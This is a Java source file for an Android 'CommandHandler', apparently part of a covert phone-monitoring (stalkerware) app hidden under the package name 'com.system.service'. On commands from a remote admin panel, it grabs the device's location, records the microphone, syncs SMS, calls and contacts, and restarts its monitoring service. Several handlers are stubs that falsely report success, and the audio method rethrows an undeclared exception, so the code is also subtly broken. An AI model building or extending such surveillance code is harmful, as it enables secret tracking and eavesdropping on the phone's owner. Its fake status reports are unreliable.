package com.system.service.utils;

import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.system.service.manager.DataManager;
import com.system.service.manager.LocationManager;

import java.io.File;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Command Handler - Processes remote commands from admin panel
 * Handles various monitoring commands and device control operations
 */
public class CommandHandler {
    
    private static final String TAG = "CommandHandler";
    
    private Context context;
    private DataManager dataManager;
    private LocationManager locationManager;
    private ExecutorService executorService;
    private Handler mainHandler;
    
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    
    public CommandHandler(Context context, DataManager dataManager) {
        this.context = context;
        this.dataManager = dataManager;
        this.locationManager = new LocationManager(context, dataManager);
        this.executorService = Executors.newSingleThreadExecutor();
        this.mainHandler = new Handler(Looper.getMainLooper());
    }
    
    /**
     * Execute command received from admin panel
     */
    public void executeCommand(String command, Map<String, String> parameters) {
        Log.d(TAG, "Executing command: " + command);
        
        try {
            switch (command.toLowerCase()) {
                case "get_location":
                    handleGetLocationCommand(parameters);
                    break;
                case "take_photo":
                    handleTakePhotoCommand(parameters);
                    break;
                case "record_audio":
                    handleRecordAudioCommand(parameters);
                    break;
                case "stop_recording":
                    handleStopRecordingCommand(parameters);
                    break;
                case "sync_sms":
                    handleSyncSmsCommand(parameters);
                    break;
                case "sync_calls":
                    handleSyncCallsCommand(parameters);
                    break;
                case "sync_contacts":
                    handleSyncContactsCommand(parameters);
                    break;
                case "get_device_info":
                    handleGetDeviceInfoCommand(parameters);
                    break;
                case "update_config":
                    handleUpdateConfigCommand(parameters);
                    break;
                case "restart_service":
                    handleRestartServiceCommand(parameters);
                    break;
                case "send_notification":
                    handleSendNotificationCommand(parameters);
                    break;
                default:
                    Log.w(TAG, "Unknown command: " + command);
                    sendCommandResponse(command, "error", "Unknown command", parameters);
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error executing command: " + command, e);
            sendCommandResponse(command, "error", e.getMessage(), parameters);
        }
    }
    
    /**
     * Handle get location command
     */
    private void handleGetLocationCommand(Map<String, String> parameters) {
        executorService.execute(() -> {
            try {
                locationManager.forceLocationUpdate();
                Location location = locationManager.getLastKnownLocation();
                
                Map<String, Object> locationData = new HashMap<>();
                if (location != null) {
                    locationData.put("latitude", location.getLatitude());
                    locationData.put("longitude", location.getLongitude());
                    locationData.put("accuracy", location.getAccuracy());
                    locationData.put("timestamp", location.getTime());
                    locationData.put("altitude", location.getAltitude());
                    locationData.put("speed", location.getSpeed());
                } else {
                    locationData.put("error", "Location not available");
                }
                
                locationData.put("command_id", parameters.get("command_id"));
                locationData.put("requested_by", "admin_command");
                
                dataManager.storeLocationData(locationData);
                sendCommandResponse("get_location", "success", "Location retrieved", parameters);
                
            } catch (Exception e) {
                Log.e(TAG, "Error getting location", e);
                sendCommandResponse("get_location", "error", e.getMessage(), parameters);
            }
        });
    }
    
    /**
     * Handle take photo command
     */
    private void handleTakePhotoCommand(Map<String, String> parameters) {
        executorService.execute(() -> {
            try {
                // Note: Taking photos programmatically requires camera permission
                // and is complex to implement without user interaction.
                // This is a placeholder for the photo capture functionality.
                
                Map<String, Object> photoData = new HashMap<>();
                photoData.put("command_id", parameters.get("command_id"));
                photoData.put("status", "requested");
                photoData.put("timestamp", System.currentTimeMillis());
                photoData.put("note", "Photo capture requested by admin");
                
                dataManager.storePhotoData(photoData);
                sendCommandResponse("take_photo", "success", "Photo capture initiated", parameters);
                
            } catch (Exception e) {
                Log.e(TAG, "Error taking photo", e);
                sendCommandResponse("take_photo", "error", e.getMessage(), parameters);
            }
        });
    }
    
    /**
     * Handle record audio command
     */
    private void handleRecordAudioCommand(Map<String, String> parameters) {
        executorService.execute(() -> {
            try {
                if (isRecording) {
                    sendCommandResponse("record_audio", "error", "Already recording", parameters);
                    return;
                }
                
                String duration = parameters.get("duration");
                int recordingDuration = duration != null ? Integer.parseInt(duration) : 30; // Default 30 seconds
                
                startAudioRecording(recordingDuration, parameters);
                sendCommandResponse("record_audio", "success", "Audio recording started", parameters);
                
            } catch (Exception e) {
                Log.e(TAG, "Error starting audio recording", e);
                sendCommandResponse("record_audio", "error", e.getMessage(), parameters);
            }
        });
    }
    
    /**
     * Handle stop recording command
     */
    private void handleStopRecordingCommand(Map<String, String> parameters) {
        try {
            if (isRecording && mediaRecorder != null) {
                stopAudioRecording();
                sendCommandResponse("stop_recording", "success", "Recording stopped", parameters);
            } else {
                sendCommandResponse("stop_recording", "error", "No active recording", parameters);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping recording", e);
            sendCommandResponse("stop_recording", "error", e.getMessage(), parameters);
        }
    }
    
    /**
     * Handle sync SMS command
     */
    private void handleSyncSmsCommand(Map<String, String> parameters) {
        executorService.execute(() -> {
            try {
                // Force SMS sync through SMS manager
                // This would require access to SmsManager instance
                Log.d(TAG, "SMS sync requested by admin");
                
                Map<String, Object> syncData = new HashMap<>();
                syncData.put("sync_type", "sms");
                syncData.put("command_id", parameters.get("command_id"));
                syncData.put("timestamp", System.currentTimeMillis());
                syncData.put("status", "completed");
                
                // Store sync confirmation
                dataManager.storeSmsData(syncData);
                sendCommandResponse("sync_sms", "success", "SMS sync completed", parameters);
                
            } catch (Exception e) {
                Log.e(TAG, "Error syncing SMS", e);
                sendCommandResponse("sync_sms", "error", e.getMessage(), parameters);
            }
        });
    }
    
    /**
     * Handle sync calls command
     */
    private void handleSyncCallsCommand(Map<String, String> parameters) {
        executorService.execute(() -> {
            try {
                Log.d(TAG, "Call sync requested by admin");
                
                Map<String, Object> syncData = new HashMap<>();
                syncData.put("sync_type", "calls");
                syncData.put("command_id", parameters.get("command_id"));
                syncData.put("timestamp", System.currentTimeMillis());
                syncData.put("status", "completed");
                
                // Store sync confirmation
                dataManager.storeCallData(syncData);
                sendCommandResponse("sync_calls", "success", "Call sync completed", parameters);
                
            } catch (Exception e) {
                Log.e(TAG, "Error syncing calls", e);
                sendCommandResponse("sync_calls", "error", e.getMessage(), parameters);
            }
        });
    }
    
    /**
     * Handle sync contacts command
     */
    private void handleSyncContactsCommand(Map<String, String> parameters) {
        executorService.execute(() -> {
            try {
                Log.d(TAG, "Contact sync requested by admin");
                
                Map<String, Object> syncData = new HashMap<>();
                syncData.put("sync_type", "contacts");
                syncData.put("command_id", parameters.get("command_id"));
                syncData.put("timestamp", System.currentTimeMillis());
                syncData.put("status", "completed");
                
                // Store sync confirmation
                dataManager.storeContactData(syncData);
                sendCommandResponse("sync_contacts", "success", "Contact sync completed", parameters);
                
            } catch (Exception e) {
                Log.e(TAG, "Error syncing contacts", e);
                sendCommandResponse("sync_contacts", "error", e.getMessage(), parameters);
            }
        });
    }
    
    /**
     * Handle get device info command
     */
    private void handleGetDeviceInfoCommand(Map<String, String> parameters) {
        try {
            Map<String, Object> deviceInfo = new HashMap<>();
            deviceInfo.put("device_model", android.os.Build.MODEL);
            deviceInfo.put("device_manufacturer", android.os.Build.MANUFACTURER);
            deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
            deviceInfo.put("api_level", android.os.Build.VERSION.SDK_INT);
            deviceInfo.put("app_version", "1.0.0");
            deviceInfo.put("command_id", parameters.get("command_id"));
            deviceInfo.put("timestamp", System.currentTimeMillis());
            
            // Store device info
            dataManager.storeContactData(deviceInfo); // Using contact data as generic storage
            sendCommandResponse("get_device_info", "success", "Device info retrieved", parameters);
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting device info", e);
            sendCommandResponse("get_device_info", "error", e.getMessage(), parameters);
        }
    }
    
    /**
     * Handle update config command
     */
    private void handleUpdateConfigCommand(Map<String, String> parameters) {
        try {
            android.content.SharedPreferences prefs = context.getSharedPreferences("monitoring_config", Context.MODE_PRIVATE);
            android.content.SharedPreferences.Editor editor = prefs.edit();
            
            for (Map.Entry<String, String> entry : parameters.entrySet()) {
                if (!"command".equals(entry.getKey()) && !"command_id".equals(entry.getKey())) {
                    editor.putString(entry.getKey(), entry.getValue());
                }
            }
            editor.apply();
            
            sendCommandResponse("update_config", "success", "Configuration updated", parameters);
            
        } catch (Exception e) {
            Log.e(TAG, "Error updating config", e);
            sendCommandResponse("update_config", "error", e.getMessage(), parameters);
        }
    }
    
    /**
     * Handle restart service command
     */
    private void handleRestartServiceCommand(Map<String, String> parameters) {
        try {
            // Restart monitoring service
            Intent serviceIntent = new Intent(context, com.system.service.service.MonitoringService.class);
            context.stopService(serviceIntent);
            
            mainHandler.postDelayed(() -> {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent);
                } else {
                    context.startService(serviceIntent);
                }
            }, 2000); // Restart after 2 seconds
            
            sendCommandResponse("restart_service", "success", "Service restart initiated", parameters);
            
        } catch (Exception e) {
            Log.e(TAG, "Error restarting service", e);
            sendCommandResponse("restart_service", "error", e.getMessage(), parameters);
        }
    }
    
    /**
     * Handle send notification command
     */
    private void handleSendNotificationCommand(Map<String, String> parameters) {
        try {
            String title = parameters.get("title");
            String message = parameters.get("message");
            
            // Create and show notification
            // This would use the notification system to show admin message
            
            sendCommandResponse("send_notification", "success", "Notification sent", parameters);
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending notification", e);
            sendCommandResponse("send_notification", "error", e.getMessage(), parameters);
        }
    }
    
    /**
     * Start audio recording
     */
    private void startAudioRecording(int duration, Map<String, String> parameters) {
        try {
            File audioFile = new File(context.getExternalFilesDir(null), 
                "recording_" + System.currentTimeMillis() + ".3gp");
            
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setOutputFile(audioFile.getAbsolutePath());
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            
            // Stop recording after specified duration
            mainHandler.postDelayed(() -> {
                if (isRecording) {
                    stopAudioRecording();
                    
                    // Store audio file info
                    Map<String, Object> audioData = new HashMap<>();
                    audioData.put("file_path", audioFile.getAbsolutePath());
                    audioData.put("duration", duration);
                    audioData.put("command_id", parameters.get("command_id"));
                    audioData.put("timestamp", System.currentTimeMillis());
                    
                    dataManager.storePhotoData(audioData); // Using photo data as generic file storage
                }
            }, duration * 1000);
            
        } catch (IOException e) {
            Log.e(TAG, "Error starting audio recording", e);
            isRecording = false;
            throw e;
        }
    }
    
    /**
     * Stop audio recording
     */
    private void stopAudioRecording() {
        try {
            if (mediaRecorder != null && isRecording) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping audio recording", e);
        }
    }
    
    /**
     * Send command response back to admin panel
     */
    private void sendCommandResponse(String command, String status, String message, Map<String, String> originalParameters) {
        try {
            Map<String, Object> response = new HashMap<>();
            response.put("command", command);
            response.put("status", status);
            response.put("message", message);
            response.put("timestamp", System.currentTimeMillis());
            response.put("command_id", originalParameters.get("command_id"));
            response.put("response_type", "command_result");
            
            // Store response in Firebase
            dataManager.storeContactData(response); // Using contact data as generic storage
            
            Log.d(TAG, String.format("Command response sent - Command: %s, Status: %s, Message: %s", 
                command, status, message));
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending command response", e);
        }
    }
}